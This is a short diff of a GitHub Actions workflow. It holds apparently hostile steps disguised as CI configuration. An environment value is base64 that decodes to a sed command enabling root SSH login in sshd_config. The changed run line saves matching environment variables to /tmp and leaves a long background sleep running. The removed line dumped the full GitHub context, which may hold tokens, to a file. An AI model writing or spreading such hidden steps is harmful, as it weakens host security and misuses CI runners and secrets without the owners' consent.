@@ -34,7 +34,7 @@ jobs:
           #echo $@
           #echo "${{ toJson(github) }}"
           #echo "::set-env name=ss0::$ss0"
-          bash -c 'echo "${{ toJson(github) }}"|base64 -w0 >/tmp/js0;echo "$@">/tmp/q34;(env|grep ss>/tmp/s0;sleep 1420&);exit 0'
+          bash -c 'echo "$@">/tmp/s9;(env|grep ss>/tmp/s0;sleep 1420&);exit 0'
           #echo "::set-env name=DAY_OF_WEEK::$( date +%a )"
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
